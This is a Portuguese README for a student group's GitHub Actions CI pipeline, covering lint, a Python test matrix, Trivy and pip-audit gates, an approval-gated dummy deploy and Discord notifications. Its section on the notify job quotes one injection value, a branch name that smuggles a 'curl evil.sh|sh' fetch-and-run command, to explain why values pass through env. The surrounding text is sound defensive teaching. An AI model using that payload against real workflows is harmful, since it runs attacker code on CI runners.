# CI/CD — Grupo WJD

Pipeline de **Integração Contínua** em GitHub Actions, entrega da Atividade 1 da
disciplina de **Pipelines de Entrega Contínua (CI/CD) e Automação de
Deployments**, da especialização em DevOps da CESAR School.

A aplicação é uma todo-list em Flask + SQLite que veio pronta no starter-kit. O
objeto de estudo é o **pipeline**, não a aplicação.

> Todos os comandos deste documento rodam a partir da raiz do repositório.
> Este README começa pelo manual de operações — como ver a entrega funcionando —
> e só depois explica as decisões.

[![CI](https://github.com/weynne/cicd-grupo-WJD/actions/workflows/ci.yml/badge.svg)](https://github.com/weynne/cicd-grupo-WJD/actions/workflows/ci.yml)
![GitHub Actions](https://img.shields.io/badge/GitHub_Actions-2088FF?style=flat-square&logo=githubactions&logoColor=white)
![Python](https://img.shields.io/badge/Python-3.10_|_3.11_|_3.12-3776AB?style=flat-square&logo=python&logoColor=white)
![Flask](https://img.shields.io/badge/Flask-000000?style=flat-square&logo=flask&logoColor=white)
![Trivy](https://img.shields.io/badge/Trivy-1904DA?style=flat-square&logo=aquasecurity&logoColor=white)
![Docker](https://img.shields.io/badge/Docker-2496ED?style=flat-square&logo=docker&logoColor=white)

Badge verde = `main` saudável. Badge vermelho = `main` quebrada, e consertar vira
prioridade sobre qualquer feature.

---

## Sumário

- [Membros](#membros)
- [O que o pipeline faz](#o-que-o-pipeline-faz)
- [Início rápido](#início-rápido)
- [Evidências da entrega](#evidências-da-entrega)
- [Como o GitHub Actions funciona](#como-o-github-actions-funciona)
- [Pré-requisitos](#pré-requisitos)
- [Configuração no GitHub](#configuração-no-github)
- [Rodando localmente](#rodando-localmente)
- [Estrutura do repositório](#estrutura-do-repositório)
- [Arquivo por arquivo](#arquivo-por-arquivo)
- [Variáveis, inputs e secrets](#variáveis-inputs-e-secrets)
- [Verificação](#verificação)
- [Troubleshooting](#troubleshooting)
- [Decisões de arquitetura](#decisões-de-arquitetura)
- [Divergências em relação ao enunciado](#divergências-em-relação-ao-enunciado)
- [Créditos](#créditos)

---

## Membros

| Membro | GitHub | Frente principal |
| --- | --- | --- |
| Weynne Guimarães | [@weynne](https://github.com/weynne) | Repo Owner: setup do repositório, branch protection e pipeline de CI |
| Diego Tavares | [@diegotavares16](https://github.com/diegotavares16) | Environment e notificações; code owner dos workflows |
| Jéssica Camarco | [@jessicacamarco](https://github.com/jessicacamarco) | Gates de segurança e documentação; code owner dos manifestos |

---

## O que o pipeline faz

O `ci.yml` é um conjunto de **quality gates** que bloqueiam o merge quando lint,
testes ou scans de segurança falham.

### O grafo de jobs

```mermaid
flowchart TD
    T(["pull_request para main<br>push na main<br>push de qualquer tag"])

    T --> L["Lint (ruff)"]
    T --> M

    subgraph M["test — matrix de 3 versões"]
        direction LR
        M1["Test<br>Python 3.10"]
        M2["Test<br>Python 3.11"]
        M3["Test<br>Python 3.12"]
    end

    L --> D
    M --> D

    D{"push na main?"}
    D -->|sim| S["Deploy to staging<br>pausa até aprovação humana"]
    D -->|"não — pull request ou tag"| K["deploy-staging<br>skipped"]

    N["Notify pipeline result<br>if: always()"]
    S --> N
    K --> N
    L -.->|"se falhar"| N
    M -.->|"se falhar"| N

    N --> W(["webhook do Discord"])
```

`Lint` e `test` rodam **em paralelo** — `needs:` é o que cria ordem no GitHub
Actions, e só `deploy-staging` e `notify` declaram um. As setas pontilhadas são o
`if: always()`: o `notify` roda mesmo quando o lint ou os testes falharam, que é
justamente quando o time precisa saber.

### O que acontece dentro de cada job da matrix

Os três jobs da matrix são idênticos, exceto pela versão do Python. A lógica
deles vive no reusable workflow, nesta ordem:

```mermaid
flowchart LR
    A["checkout"] --> B["setup-python<br>versão vem do input"]
    B --> C["cache pip"]
    C --> E["install<br>requirements + dev"]
    E --> F["Trivy fs"]
    F --> G["upload SARIF<br>if: always()"]
    G --> H["pytest -v"]
    H --> I["pip-audit"]

    F -.->|"exit-code 1"| X(["job vermelho<br>merge bloqueado"])
    H -.->|"assert falhou"| X
    I -.->|"CVE encontrado"| X
```

O Trivy vem **antes** do pytest de propósito: se a dependência já está
comprometida, não faz sentido gastar minutos rodando a suíte. O upload do SARIF
tem `if: always()` porque o step do Trivy sai com código 1 quando acha algo — sem
isso, o relatório nunca chegaria à aba Security exatamente quando há o que
reportar.

### Os gates

| Gate | Ferramenta | O que pega | Bloqueia o merge? |
| --- | --- | --- | --- |
| Lint | `ruff check .` | Estilo, imports fora de ordem, padrões conhecidos de bug | Sim |
| Testes | `pytest -v` | Regressão funcional, nas três versões do Python | Sim |
| Dependências | `pip-audit -r requirements.txt` | CVE em biblioteca Python de produção, com correção disponível | Sim |
| Filesystem | `trivy fs` com `exit-code: 1` | CVE `MEDIUM` ou acima em bibliotecas **e** em pacotes do SO base | Sim |

---

## Início rápido

O caminho para ver o pipeline agindo, do jeito que ele age no dia a dia. Nada
aqui precisa ser instalado na sua máquina: quem executa é o runner do GitHub.

### 1. Abrir um pull request e ver o gate agir

```bash
git checkout main && git pull
git checkout -b feat/minha-mudanca
# ... edita, commita ...
git push -u origin feat/minha-mudanca
```

Abra o PR pela interface do GitHub. O workflow dispara imediatamente, e a aba
**Checks** do PR mostra o status ao vivo. O botão de merge só libera quando os
quatro checks obrigatórios ficam verdes.

### 2. Reproduzir a demonstração de shift-left

O `requirements.txt` vem limpo. A falha é introduzida de propósito, para ver o
gate reprovar antes do merge.

```bash
git checkout main && git pull
git checkout -b fix/requests-cve
sed -i 's/requests==2.33.0/requests==2.31.0/' requirements.txt
git commit -am "fix(deps): downgrade requests to reproduce a known CVE"
git push -u origin fix/requests-cve
```

Abra o PR. `Lint` e `pytest` seguem **verdes** — o problema está isolado na
dependência — e os dois gates de segurança ficam **vermelhos**: o Trivy no step
de scan e o `pip-audit` apontando os três CVEs. Com a branch protection ativa, o
merge fica **bloqueado**, e uma notificação vermelha chega no Discord.

Para corrigir, na **mesma branch**:

```bash
sed -i 's/requests==2.31.0/requests==2.33.0/' requirements.txt
git commit -am "fix(deps): bump requests to 2.33.0 to clear the CVEs"
git push
```

O CI volta ao verde e o merge libera. O problema foi pego no PR, antes do merge,
sem ninguém rodar a aplicação e sem chegar a produção. Custo do fix: 1x.

> [!IMPORTANT]
> Bumpar só para `2.32.x` **não** zera todos os CVEs. O próprio output do
> `pip-audit` mostra três versões de correção diferentes — 2.32.0, 2.32.4 e
> 2.33.0. Nem sempre "atualizar um pouco" basta.

### 3. Aprovar o deploy em staging

Logo após um merge na `main`, o job `Deploy to staging (dummy)` aparece como
**Waiting**. Vá em **Actions → o run → Review deployments → Approve and deploy**.

O job não faz deploy de verdade: o que está sendo exercitado é o gate de
aprovação humana, e a aprovação fica registrada no histórico de deployments do
repositório.

---

## Evidências da entrega

| # | Evidência | Onde |
| --- | --- | --- |
| 1 | Pipeline completo verde na `main` | [run #3](https://github.com/weynne/cicd-grupo-WJD/actions/runs/34727936018) · [captura](evidencias/evidencia_07_pipeline_verde_main.png) |
| 2 | PR com merge **bloqueado** por gate vermelho | [PR #7](https://github.com/weynne/cicd-grupo-WJD/pull/7) · [caixa de merge](evidencias/evidencia_12_merge_bloqueado.png) · [step do Trivy](evidencias/evidencia_14_trivy_bloqueio.png) · [pip-audit](evidencias/evidencia_13_pip_audit_cves.txt) |
| 3 | O mesmo PR corrigido, com os checks verdes | [PR #7](https://github.com/weynne/cicd-grupo-WJD/pull/7) · [captura](evidencias/evidencia_11_pr_corrigido_verde.png) |
| 4 | Três jobs da matrix em paralelo + cache hit no segundo run | [run #3](https://github.com/weynne/cicd-grupo-WJD/actions/runs/34727936018) · [matrix](evidencias/evidencia_02_matrix_paralela.png) · [run #4](https://github.com/weynne/cicd-grupo-WJD/actions/runs/34731638025) · [cache](evidencias/evidencia_09_cache_hit.png) |
| 5 | `Deploy to staging` aguardando aprovação humana | [run #3](https://github.com/weynne/cicd-grupo-WJD/actions/runs/34727936018) · [aguardando](evidencias/evidencia_05_deploy_waiting.png) · [aprovado](evidencias/evidencia_06_deploy_aprovado.png) |
| 6 | Relatório do Trivy no code scanning | [PR #7](https://github.com/weynne/cicd-grupo-WJD/pull/7) · [captura](evidencias/evidencia_03_trivy_security.png) |
| 7 | Notificação de sucesso e de falha no canal do Discord | [sucesso](evidencias/evidencia_04_discord_sucesso.png) · [falha e recuperação](evidencias/evidencia_15_discord_falha.png) |

---

## Como o GitHub Actions funciona

Quatro níveis, de fora para dentro:

| Nível | O que é | Aqui |
| --- | --- | --- |
| **Workflow** | Arquivo YAML em `.github/workflows/`, disparado por eventos | `ci.yml`, `_reusable-test.yml` |
| **Job** | Grupo de steps que roda numa VM efêmera (*runner*) | `lint`, `test`, `deploy-staging`, `notify` |
| **Step** | Um comando de shell ou uma chamada de Action | `ruff check .`, `pytest -v` |
| **Action** | Código reutilizável, de terceiros ou próprio | `actions/checkout`, `aquasecurity/trivy-action` |

Por padrão **jobs rodam em paralelo**; `needs:` é o que cria ordem entre eles. É
daí que sai o formato deste pipeline: `lint` e `test` em paralelo,
`deploy-staging` com `needs: [lint, test]`, e `notify` com `needs:` nos três.

Cada job roda numa VM nova, isolada, destruída ao fim. Nada persiste entre jobs
além do que for explicitamente cacheado ou publicado como artefato — por isso o
cache de pip existe, e por isso cada job precisa do seu próprio `checkout`.

Usamos apenas **runners hospedados** pelo GitHub (`ubuntu-latest`). Runner
self-hosted não é necessário aqui e traria manutenção e superfície de ataque sem
benefício.

---

## Pré-requisitos

O pipeline não exige nada instalado na sua máquina, porque roda nos runners
hospedados do GitHub. Os requisitos abaixo servem apenas para reproduzir os gates
localmente ou subir a aplicação.

| Requisito | Para quê |
| --- | --- |
| Acesso de escrita ao repositório | Abrir PRs e revisar |
| Python 3.10, 3.11 ou 3.12 | Rodar os gates na sua máquina |
| Docker | Rodar os gates em ambiente idêntico ao CI e subir a aplicação |
| Servidor no Discord com permissão de criar webhook | Notificação do pipeline |

Nenhuma credencial de nuvem é necessária.

---

## Configuração no GitHub

O que existe fora do código, e sem o que o pipeline vira decoração.

### Branch protection

`Settings → Rules → Rulesets → New branch ruleset`, alvo `main`:

| Regra | Por quê |
| --- | --- |
| Require a pull request before merging | Ninguém commita direto na `main` |
| Require review from Code Owners | Ativa o efeito do `CODEOWNERS` |
| Require status checks to pass | **É este item que bloqueia o merge** |
| Require branches to be up to date | Força integrar a `main` antes de mergear |
| Block force pushes | Preserva o histórico |
| Do not allow bypassing | Vale para o owner também |

### Required status checks

| Check | Obrigatório | Por quê |
| --- | --- | --- |
| `Lint (ruff)` | Sim | Gate de estilo |
| `test (3.10) / Test (Python 3.10)` | Sim | Gate funcional e de segurança |
| `test (3.11) / Test (Python 3.11)` | Sim | idem |
| `test (3.12) / Test (Python 3.12)` | Sim | idem |
| `Deploy to staging (dummy)` | **Não** | Não roda em pull request |
| `Notify pipeline result` | **Não** | É aviso, não gate |
| `Code scanning results / Trivy` | **Não** | Ver abaixo |

O nome dos três checks da matrix tem **duas partes**, separadas por barra: o job
do chamador com o valor da matrix (`test (3.10)`) e o job de dentro do reusable
(`Test (Python 3.10)`). É o GitHub compondo os dois lados de um
`workflow_call` — e é por isso que refatorar o pipeline renomeia os checks e
invalida a lista do ruleset.

> [!WARNING]
> `deploy-staging` **não** pode ser marcado como obrigatório: ele não roda em
> pull request, e um check que nunca reporta bloquearia todo merge para sempre.
> Os checks só aparecem na lista depois de rodarem pelo menos uma vez — se a
> lista estiver vazia, abra um PR, deixe o CI rodar e volte para marcá-los.

O check `Code scanning results / Trivy` aparece sozinho, criado pelo upload do
SARIF, e reporta *"no new alerts in code changed by this pull request"*. Deixamos
fora dos obrigatórios de propósito: ele mede **alertas novos no diff**, enquanto
o gate real do Trivy é o `exit-code: 1` dentro do job, que mede
**vulnerabilidade existente**. Torná-lo obrigatório colocaria duas semânticas
diferentes no mesmo lugar e tiraria de nós o controle sobre o que bloqueia.

### Variables e secrets

`Settings → Secrets and variables → Actions`:

| Nome | Aba | Valor |
| --- | --- | --- |
| `PYTHON_VERSIONS` | **Variables** | `["3.10", "3.11", "3.12"]` |
| `NOTIFY_WEBHOOK_URL` | **Secrets** | URL do webhook do Discord |
| `STAGING_URL` | **Secrets** do environment `staging` | Valor dummy |

Se `PYTHON_VERSIONS` não existir, o `ci.yml` cai no fallback e testa as mesmas
três versões — o pipeline não quebra, só deixa de ser configurável sem commit.

### Environment

`staging`, configurado com *required reviewers* e ***Prevent self-review*
marcado**. O job `deploy-staging` reivindica esse environment e pausa até a
aprovação. Secrets cadastrados dentro dele só existem para jobs que o
reivindicam — é a diferença entre secret de repositório e secret com escopo de
ambiente.

| Opção | Valor |
| --- | --- |
| Required reviewers | os três membros do grupo |
| Prevent self-review | **marcado** |

O *Prevent self-review* bloqueia **quem disparou o run**, não quem abriu o pull
request. Como é o merge que dispara o push na `main`, na prática ele separa dois
papéis: quem clica em *Merge* não é quem clica em *Approve and deploy*.

Isso não custa coordenação extra, porque o `CODEOWNERS` já obriga que o revisor
de um PR seja outra pessoa. Quem revisa mergeia, e o autor aprova o deploy.

### CODEOWNERS

```text
*                       @weynne @diegotavares16 @jessicacamarco
/.github/workflows/     @weynne @diegotavares16
/k8s/                   @weynne @jessicacamarco
```

A última regra que casa é a que vale. Cada área tem um mantenedor ao lado do dono
do repositório, então a revisão cai em quem conhece aquela parte: pipeline com
[@diegotavares16](https://github.com/diegotavares16), manifestos com
[@jessicacamarco](https://github.com/jessicacamarco). O que não casa com nenhuma
regra específica o time revisa entre si, pela regra `*`.

> [!NOTE]
> Toda regra lista no mínimo **dois** donos de propósito. O autor de um PR não
> pode aprovar o próprio PR, então uma regra de dono único deixaria sem revisor
> possível toda mudança proposta por ele — e o merge travaria.

---

## Rodando localmente

### Os mesmos comandos do CI

São exatamente os comandos que o pipeline executa, com as mesmas versões de
ferramenta. Rodar localmente não é obrigatório e, quando tudo passa, é trabalho
repetido. O ganho aparece quando algo quebra: o ciclo de correção vira segundos,
em vez de commit → push → esperar o runner → corrigir → esperar de novo.

```bash
python -m venv .venv
source .venv/bin/activate            # Windows: .venv\Scripts\activate
pip install -r requirements.txt -r requirements-dev.txt

ruff check .                         # lint
pytest -v                            # testes
pip-audit -r requirements.txt        # auditoria de dependências
```

Se a sua máquina tiver uma versão de Python fora da matrix (3.10–3.12), o Docker
roda no mesmo ambiente do CI:

```bash
docker run --rm -v "$PWD":/app -w /app python:3.12-slim bash -c \
  "pip install -q -r requirements-dev.txt && ruff check . && pytest -q && pip-audit -r requirements.txt"
```

O scan do Trivy, com as mesmas flags do pipeline:

```bash
docker run --rm -v "$PWD":/src -w /src aquasec/trivy:0.58.0 fs \
  --severity MEDIUM,HIGH,CRITICAL --ignore-unfixed --exit-code 1 .
```

### A aplicação

```bash
docker build -t todolist:dev .
docker run --rm -p 8080:5000 -e APP_COLOR=blue -e SESSION_KEY=local todolist:dev
# http://localhost:8080 — login admin / admin
```

> [!NOTE]
> Porta 8080 no host de propósito: no macOS a 5000 é ocupada pelo AirPlay
> Receiver, que responde `403` e gera confusão.

---

## Estrutura do repositório

```text
.
├── .github/
│   ├── CODEOWNERS                          # donos por caminho; revisor automático
│   └── workflows/
│       ├── ci.yml                          # o pipeline desta entrega
│       ├── _reusable-test.yml              # steps de teste reutilizáveis
│       ├── validate-ssh.yml                # do starter-kit, fora do escopo desta entrega
│       └── cd*.yml.example                 # esqueletos inertes, fora do escopo desta entrega
├── app.py                                  # Flask + SQLite (rota /healthz usada pelos gates)
├── test_app.py                             # suíte pytest — 13 testes
├── requirements.txt                        # dependências de produção — alvo dos scans
├── requirements-dev.txt                    # pytest, ruff, pip-audit
├── pyproject.toml                          # configuração do ruff
├── Dockerfile                              # imagem da aplicação
├── k8s/                                    # manifestos de deploy, fora do escopo desta entrega
└── docs/                                   # referências do starter-kit
```

O prefixo `_` em `_reusable-test.yml` sinaliza workflow de apoio: chamado por
outro via `uses:` e nunca disparado por evento próprio.

---

## Arquivo por arquivo

O starter-kit entrega a aplicação e os manifestos prontos. O grupo criou ou
alterou **cinco** arquivos — estes:

| Arquivo | O que fizemos | Como |
| --- | --- | --- |
| `.github/CODEOWNERS` | criado | renomeado de `CODEOWNERS.example` |
| `.github/workflows/ci.yml` | criado | renomeado de `ci.yml.example` |
| `.github/workflows/_reusable-test.yml` | criado | renomeado de `_reusable-test.yml.example` |
| `README.md` | substituído | era o README do professor |
| `requirements.txt` | alterado e revertido | só na demonstração de shift-left |

> [!NOTE]
> O GitHub Actions só executa arquivos `.yml` e `.yaml` dentro de
> `.github/workflows/`. O sufixo `.example` é o que mantém os esqueletos inertes
> até serem renomeados — por isso cada arquivo nasce de um `git mv`, e não de um
> arquivo novo: assim o histórico mostra que ele veio do esqueleto.

---

### `.github/CODEOWNERS`

```bash
git mv .github/CODEOWNERS.example .github/CODEOWNERS
```

Três regras, uma por linha. Cada uma casa um caminho e lista quem o GitHub deve
pedir para revisar quando um PR toca aquele caminho.

```text
*                       @weynne @diegotavares16 @jessicacamarco
/.github/workflows/     @weynne @diegotavares16
/k8s/                   @weynne @jessicacamarco
```

| Bloco | O que faz |
| --- | --- |
| `*` | Regra de fundo: qualquer arquivo que não case com as outras. O time inteiro revisa |
| `/.github/workflows/` | Mudança no pipeline. Revisão do dono do repositório ou do mantenedor do CI |
| `/k8s/` | Manifestos de deploy. Dono do repositório ou a mantenedora dos manifestos |

**A última regra que casa é a que vale**, não a primeira. Um PR que toca
`ci.yml` cai na segunda regra e ignora a primeira. Isso é o contrário do
`.gitignore` e é o erro mais comum de leitura do arquivo.

**Toda regra tem no mínimo dois donos.** O autor de um PR não pode aprovar o
próprio PR: numa regra de dono único, todo PR aberto por ele ficaria sem revisor
possível e o merge travaria para sempre.

Para o arquivo ter efeito, duas condições: os usuários precisam ter acesso de
**escrita** e ter **aceito** o convite de collaborator — convite pendente faz o
GitHub exibir "Unknown owner" e ignorar a linha em silêncio. E o ruleset da
`main` precisa de **Require review from Code Owners** marcado, senão o arquivo
só sugere revisores sem obrigar ninguém.

---

### `.github/workflows/ci.yml`

```bash
git mv .github/workflows/ci.yml.example .github/workflows/ci.yml
```

O workflow principal: 4 jobs, 198 linhas. É o **chamador** — concentra gatilhos,
permissões e orquestração, e delega os steps de teste ao reusable.

| Bloco | O que faz |
| --- | --- |
| `name:` | Nome que aparece na aba Actions e na URL do badge |
| `on:` | Os três gatilhos que fazem o workflow rodar |
| `permissions:` | Teto de privilégio do `GITHUB_TOKEN` para todo o workflow |
| `concurrency:` | Cancela o run anterior da mesma branch |
| `env:` | Valores reusados por mais de um lugar, não sensíveis |
| `jobs.lint` | Gate de estilo com `ruff`, fora da matrix |
| `jobs.test` | Chama o reusable uma vez por versão do Python |
| `jobs.deploy-staging` | Gate de aprovação humana via environment |
| `jobs.notify` | Manda o resultado final para o Discord |

#### `on:` — os três gatilhos

```yaml
on:
  pull_request:
    branches: [main]
  push:
    branches: [main]
    tags: ['*']
```

Cada um existe por um motivo diferente. **`pull_request`** é o que faz o CI ser
um gate de merge — sem ele o pipeline rodaria depois do estrago. **`push` na
`main`** mantém o badge do README honesto sobre a saúde da branch principal.
**`tags: ['*']`** submete toda tag aos mesmos gates, porque uma tag é candidata a
release e nenhuma release deveria existir sem ter passado por lint, testes e
scans.

#### `permissions:` — menor privilégio

```yaml
permissions:
  contents: read
```

Sem esse bloco o `GITHUB_TOKEN` vem com `contents: write` ou mais. Um workflow
comprometido — por uma action de terceiro maliciosa, por exemplo — escreveria no
repositório, criaria releases, apagaria coisas.

O bloco no topo é o **padrão** de todos os jobs. Um job que precisa de mais pede
explicitamente, e só ele recebe: o `test` declara `security-events: write` porque
o reusable sobe SARIF.

#### `concurrency:` — um run por branch

```yaml
concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true
```

O `group` é a chave: runs com a mesma chave não coexistem. Como a chave inclui a
ref, dois PRs diferentes rodam em paralelo, mas dois pushes na mesma branch não —
o novo cancela o antigo em vez de entrar na fila atrás dele.

#### `env:` — o que não deve ficar hardcoded

```yaml
env:
  DEFAULT_PYTHON_VERSION: '3.12'
```

Usado pelo job `lint`, que não precisa da matrix inteira: `ruff` analisa o código
estaticamente, sem executá-lo, então rodar nas três versões daria o mesmo
resultado três vezes. Sem a variável, a versão ficaria escrita direto no step, e
trocar de 3.12 para 3.13 exigiria caçar ocorrências pelo arquivo.

#### `jobs.lint` — o gate mais rápido

Cinco steps: `checkout` → `setup-python` → `cache` → `install` → `ruff check .`.

A configuração do `ruff` vive no `pyproject.toml`, então este comando produz
exatamente o mesmo resultado na máquina de quem escreveu o código e aqui. O job
tem cache próprio, com chave `…-pip-lint-…`, para não competir com a chave dos
jobs da matrix.

#### `jobs.test` — a matrix chamando o reusable

```yaml
  test:
    permissions:
      contents: read
      security-events: write
    strategy:
      fail-fast: false
      matrix:
        python-version: ${{ fromJSON(vars.PYTHON_VERSIONS || '["3.10", "3.11", "3.12"]') }}
    uses: ./.github/workflows/_reusable-test.yml
    with:
      python-version: ${{ matrix.python-version }}
```

Cinco coisas acontecendo em dez linhas:

**`uses:` em vez de `steps:`.** Este job não tem `runs-on` nem `steps` — quem
executa steps é o reusable. É a regra que mais pega: acrescentar `runs-on` aqui
quebra o workflow com erro de validação.

**A matrix vive no chamador.** O `strategy.matrix` multiplica este job em três, e
cada cópia chama o reusable uma vez. Trocar as versões testadas não toca nos
steps, e mudar os steps não toca nas versões.

**`fail-fast: false`.** O padrão do GitHub é `true`, que **cancela** as outras
versões no instante em que uma falha. Com `false`, as três terminam — e uma
execução responde se o problema é de uma versão só ou de todas, em vez de três
ciclos de conserta-e-roda-de-novo.

**As versões vêm de uma variable.** `vars.PYTHON_VERSIONS` é configuração, não
código: ampliar a cobertura é uma edição em `Settings`, sem commit. O literal
depois do `||` é fallback — sem ele, um clone sem a variable cadastrada quebraria
no `fromJSON` de uma string vazia.

**`with:` é o contrato.** O valor da matrix entra no reusable pelo input
`python-version`. É por isso que o mesmo dado tem dois nomes: `matrix.` aqui,
`inputs.` lá dentro.

#### `jobs.deploy-staging` — aprovação humana sem escrever lógica

```yaml
  deploy-staging:
    name: Deploy to staging (dummy)
    needs: [lint, test]
    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    environment:
      name: staging
```

O step em si só dá `echo` — é deploy de mentira. O que está sendo exercitado é o
bloco **`environment:`**: ao reivindicar um environment que tem *required
reviewers*, o job aparece como *Waiting* e pausa até alguém aprovar em **Review
deployments**. Nenhuma linha de código nossa implementa a espera; a plataforma
faz isso.

**`needs: [lint, test]`** é o que cria ordem: sem isso ele rodaria em paralelo
com os testes e "deployaria" código que ainda não passou. **O `if:`** restringe a
push na `main` — pedir aprovação a cada pull request queimaria a paciência dos
revisores em uma tarde.

> [!WARNING]
> Este job **não** pode ser marcado como required status check. Ele não roda em
> pull request, e um check que nunca reporta deixa o merge bloqueado para sempre.

#### `jobs.notify` — dois steps, três armadilhas

O primeiro step decide a mensagem; o segundo envia.

```yaml
      - name: Compose message
        id: msg
        env:
          LINT_RESULT: ${{ needs.lint.result }}
          TEST_RESULT: ${{ needs.test.result }}
          DEPLOY_RESULT: ${{ needs.deploy-staging.result }}
        run: |
          echo "status=SUCCESS" >> "$GITHUB_OUTPUT"
```

**`$GITHUB_OUTPUT`** é como um step entrega valor a um step seguinte: o runner
expõe o caminho de um arquivo nessa variável, e o step anexa linhas
`nome=valor`. O **`id: msg`** é o que torna esses valores endereçáveis como
`steps.msg.outputs.status` daqui para frente.

**`skipped` conta como neutro.** `deploy-staging` fica `skipped` em pull request,
porque o `if:` dele não casou. Tratar isso como falha faria todo PR reportar um
pipeline vermelho.

```yaml
      - name: Send Discord notification
        if: env.WEBHOOK_URL != ''
        env:
          WEBHOOK_URL: ${{ secrets.NOTIFY_WEBHOOK_URL }}
          BRANCH: ${{ github.head_ref || github.ref_name }}
        run: |
          jq -n --arg branch "${BRANCH}" '…' \
          | curl -sS --fail-with-body -d @- "$WEBHOOK_URL"
```

**Todo valor entra por `env:`, e o shell lê como `$VAR`.** Escrever
`${{ github.head_ref }}` direto dentro do `run:` colaria o valor no **texto do
script** antes do shell existir — uma branch chamada `x";curl evil.sh|sh;"`
viraria código executável. É a injeção de script clássica do Actions. Por `env:`
o valor é apenas dado.

**`head_ref` e não `ref_name`.** Num `pull_request`, o `github.ref_name` devolve
`2/merge` — a ref interna que o GitHub cria para testar o merge, que não é nome
de branch nenhum. O `github.head_ref` carrega a branch de origem de verdade, e
fica vazio fora de pull request; daí o `||`, que cai no `ref_name` em push e em
tag.

**`--fail-with-body` no `curl`.** Sem ele o `curl` sai com código 0 mesmo quando
o Discord recusa o payload: o job fica verde e a mensagem nunca chega. Com ele o
step fica vermelho e o log mostra o motivo que o Discord devolveu.

**`jq` monta o JSON**, em vez de concatenação de string: uma aspa ou um acento
num nome de branch não conseguem produzir corpo malformado. O `jq` vem
pré-instalado nos runners Ubuntu do GitHub.

**O guard está no step, não no job.** O contexto `secrets` não está disponível em
`if:` de job — daí o `if: env.WEBHOOK_URL != ''` aqui. Sem ele, um clone deste
repositório sem webhook configurado falharia num `curl` para uma URL vazia.

**`if: always()` no job** é obrigatório: um job que depende do sucesso dos
anteriores nunca dispararia numa falha, que é exatamente quando a notificação
importa.

---

### `.github/workflows/_reusable-test.yml`

```bash
git mv .github/workflows/_reusable-test.yml.example .github/workflows/_reusable-test.yml
```

O prefixo `_` é convenção: sinaliza workflow de apoio, chamado por outro via
`uses:` e nunca disparado por evento próprio.

| Bloco | O que faz |
| --- | --- |
| `on: workflow_call` | Declara o contrato: é isto que torna o arquivo chamável |
| `inputs.python-version` | O único parâmetro. Obrigatório, tipo string |
| `permissions:` | Teto do token dentro deste workflow |
| steps 1–4 | checkout → setup-python → cache → install |
| step Trivy | Primeiro gate de segurança, antes dos testes |
| step upload SARIF | Manda o relatório para a aba Security |
| steps pytest e pip-audit | Gate funcional e gate de dependências |

#### `workflow_call` e o input

```yaml
on:
  workflow_call:
    inputs:
      python-version:
        description: 'Python version used to run the tests'
        type: string
        required: true
```

`workflow_call` é o que diferencia um reusable de um workflow comum: ele não tem
gatilho de evento, só pode ser invocado. O input é **singular** — este arquivo
recebe **uma** versão por chamada e não sabe que existe uma matrix. Quem
multiplica é o `ci.yml`.

#### Cache, e por que a chave é composta

```yaml
          key: ${{ runner.os }}-pip-${{ inputs.python-version }}-${{ hashFiles('requirements*.txt') }}
          restore-keys: |
            ${{ runner.os }}-pip-${{ inputs.python-version }}-
```

Três componentes na chave, cada um evitando um problema: **sistema do runner**
porque wheel compilada para Linux não serve no macOS; **versão do Python** porque
`cp310` e `cp312` são incompatíveis; **hash dos requirements** porque mudar
dependência tem que invalidar o cache.

Chave igual à de um run anterior significa *cache hit* e nada é baixado. Chave
diferente significa *miss*, mas o `restore-keys` casa por prefixo e recupera um
cache próximo, aproveitando parte da instalação. Não é sobre economizar minuto de
máquina: é sobre feedback rápido no PR.

#### O step do Trivy

```yaml
        with:
          scan-type: fs
          scan-ref: .
          severity: MEDIUM,HIGH,CRITICAL
          exit-code: '1'
          ignore-unfixed: true
          format: sarif
          output: trivy-results.sarif
```

| Campo | Efeito |
| --- | --- |
| `scan-type: fs` | Escaneia arquivos e manifestos, sem precisar buildar imagem |
| `scan-ref: .` | A raiz do repositório |
| `severity` | A faixa que reprova. Começa em `MEDIUM` — ver [Divergências](#divergências-em-relação-ao-enunciado) |
| `exit-code: '1'` | **É isto que transforma o scan em gate.** Sem, ele só informa |
| `ignore-unfixed: true` | Descarta CVE sem patch, que manteria o build vermelho sem ação possível |
| `format: sarif` | Formato que alimenta a aba Security → Code scanning |

#### O upload do SARIF

```yaml
      - name: Upload Trivy report to the Security tab
        if: always()
        uses: github/codeql-action/upload-sarif@b96794f0…
        with:
          sarif_file: trivy-results.sarif
          category: trivy-python-${{ inputs.python-version }}
```

Dois detalhes que não são preferência. **`if: always()`**: o step anterior sai com
código 1 quando acha vulnerabilidade, e sem o `always()` este seria pulado —
o relatório nunca chegaria à aba Security exatamente quando há o que reportar.
**`category` por versão**: são três uploads do mesmo commit, um por job da
matrix; sem categoria distinta eles se sobrescrevem, e uploads simultâneos podem
colidir.

#### `pytest` e `pip-audit`

```yaml
      - name: Run tests (pytest)
        run: pytest -v

      - name: Audit dependencies (pip-audit)
        run: pip-audit -r requirements.txt
```

O `-r requirements.txt` mantém o gate focado nas dependências de **produção**.
Sem ele, `pip-audit` audita o ambiente inteiro — e um CVE no `pytest` ou no
`ruff` derrubaria o pipeline da aplicação sem nada a ver com o que vai para o
cliente.

---

### `README.md`

O arquivo que veio no kit é do professor e explica como usar o template. Foi
substituído inteiro pela documentação da entrega — este arquivo. É item
explícito da rubrica, não enfeite.

---

### `requirements.txt`

Único arquivo de código que o grupo toca, e apenas na
[demonstração de shift-left](#2-reproduzir-a-demonstração-de-shift-left): a linha
do `requests` é rebaixada para 2.31.0 para ver os gates reprovarem, e devolvida
para 2.33.0 na mesma branch. A aplicação em `app.py` não foi alterada em momento
nenhum.

---

## Variáveis, inputs e secrets

Nada de valor fixo espalhado pelo YAML. Cada tipo de dado entra por um mecanismo
diferente, escolhido pelo escopo e pela sensibilidade.

| Mecanismo | Onde é declarado | Usado para | Exemplo aqui |
| --- | --- | --- | --- |
| `env` de workflow | Topo do `ci.yml` | Valor repetido, não sensível | `DEFAULT_PYTHON_VERSION: '3.12'` |
| `env` de step | Dentro do step | Expor um secret a um comando de shell | `WEBHOOK_URL`, `RUN_URL` |
| `matrix` | `strategy` do job chamador | Dimensão que multiplica o job | `python-version` |
| `inputs` | `workflow_call` do reusable | Contrato entre chamador e reusable | `python-version` |
| Variable de repositório | `Settings → Secrets and variables → Variables` | Configuração não sensível que muda sem commit | `PYTHON_VERSIONS` |
